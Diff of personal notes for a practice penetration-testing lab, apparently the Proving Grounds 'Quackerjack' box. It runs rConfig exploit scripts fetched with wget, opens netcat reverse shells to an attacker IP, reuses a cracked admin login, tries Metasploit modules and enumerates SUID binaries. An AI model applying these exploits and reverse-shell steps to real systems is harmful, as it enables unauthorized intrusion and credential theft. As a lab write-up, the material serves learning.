@@ -90,12 +90,12 @@ searchsploit rconfig
 cp /usr/share/exploitdb/exploits/php/webapps/48261.py ./
 
 # edit requests to ignore SSL
-
+nano 48261.py
 
 # to catch rev shell
 nc -nvlp 4444
 
-python3 48261.py https://QUACKERJACK:8081 192.168.49.51 4444
+python3 48261.py https://QUACKERJACK:8081 192.168.49.67 4444
 
 # $ python3  rconfig_root_RCE_unauth_final.py http://1.1.1.1 1.1.1.2 3334
 
@@ -112,7 +112,7 @@ https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rc
 # to get username and password
 wget https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rconfig_CVE-2020-10220.py
 
-# nano edit the file and add 
+# nano edit the file and add this to bypass SSL
 # request.verify = False
 nano rconfig_CVE-2020-10220.py
 
@@ -164,10 +164,146 @@ https://md5.gromweb.com/?md5=dc40b85276a1f4d7cb35f154236aa1b2
 `admin:abgrtyu`
 
 ```bash
-# to get rce
+# to get rce with our stolen login
 wget https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rconfig_CVE-2019-19509.py
 
+# in separate terminal
+ip a
+nc -nvlp 4444
+
+# edit the file and add this to bypass SSL
+# request.verify = False
+code-oss rconfig_CVE-2019-19509.py
+
+python rconfig_CVE-2019-19509.py https://quackerjack:8081 admin abgrtyu 192.168.49.67 4444
+```
 
 
+searchsploit rconfig 
 
+let's search again.
+
+```bash
+msfconsole
+
+search rconfig
+use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+
+set PASSWORD abgrtyu
+set USERNAME admin
+set RHOSTS quackerjack
+set RPORT 8081
+
+run 
+#fails
+
+use exploit/unix/webapp/rconfig_install_cmd_exec
+
+set LHOST 192.168.49.67
+
+set RHOSTS quackerjack
+set RPORT 8081
+
+```
+
+
+I'm stuck. let's go to a guide.
+
+https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/quackerjack
+
+
+https://www.exploit-db.com/exploits/47982
+
+
+```bash
+cp /usr/share/exploitdb/exploits/php/webapps/47982.py ./
+
+ip a
+nc -nvlp 80
+
+# make request.verify = False
+# request = requests.session()
+# request.verify = False
+nano 47982.py
+
+python 47982.py https://QUACKERJACK:8081/ admin abgrtyu 192.168.49.67 80
+
+```
+
+we have non-root shell!!! We needed to lower the port number for some reason.
+
+stabilize.
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+
+> "You will then elevate your privileges through a dangerous SUID find utility and extend your access using simple C code to launch a reverse shell. "
+
+okay. SUID.
+
+```bash
+find / -perm -u=s -type f 2>/dev/null | grep -v snap
+
+<<EOF
+/usr/bin/find
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/crontab
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+EOF
+```
+
+so, `/usr/bin/find`, ...
+
+```sh
+strings /usr/bin/find
+
+<<EOF
+/etc/mtab
+proc
+subfs
+kernfs
+none
+bind
+smbfs
+cifs
+invalid argument %s for %s
+ambiguous argument %s for %s
+Valid arguments are:
+  - %s
+, %s
+cycle-check.c
+state->magic == 9827862
+cycle_check
+/usr/lib64
+ASCII
+CHARSETALIASDIR
+%50s %50s
+mbuiter_multi_next
+unlabeled
+../fd
+/proc/self/fd/%d/%s
+;*3$"
+find.debug
+7zXZ
+nbKM
+WdNS
+
+EOF
 ```
